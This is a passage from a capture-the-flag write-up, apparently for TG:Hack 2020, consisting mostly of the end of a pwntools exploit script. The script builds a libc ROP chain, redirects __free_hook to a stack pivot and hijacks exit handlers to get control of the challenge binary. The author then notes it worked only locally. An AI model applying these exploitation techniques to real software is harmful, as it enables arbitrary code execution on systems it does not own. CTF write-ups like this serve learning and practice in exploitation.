<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x39049</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># syscall
</span><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xc4cc0</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># pop rdi; ret
</span><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x221ba</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># mov esi, 0x415b0007; pop rsi; ret
</span><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_target</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x12c561</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># pop rax; pop rdx; pop rbx; ret
</span><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x39049</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># syscall
</span>
<span class="n">write_addr</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">pivot_gadget</span><span class="p">))</span>
<span class="n">write_addr</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">exit_funcs</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">input_addr</span><span class="p">))</span>
<span class="n">write_block</span><span class="p">(</span><span class="n">exit_funcs</span><span class="o">+</span><span class="mh">0x8</span><span class="p">,</span> <span class="n">chain</span><span class="p">)</span>
<span class="c1"># call exit-&gt;calls __run_exit_funcs-&gt;calls free-&gt;__free_hook-&gt;stack pivot to libc rop chain
</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'5'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><img src="/assets/images/tghack2020/flag.jpg" alt="flag" /></p>

<p>I only managed to solve this locally, I couldn‚Äôt figure out what wasn‚Äôt working on the remote server- maybe some wrong offset somewhere. Still a fun challenge, which I learned a lot from</p>
:ET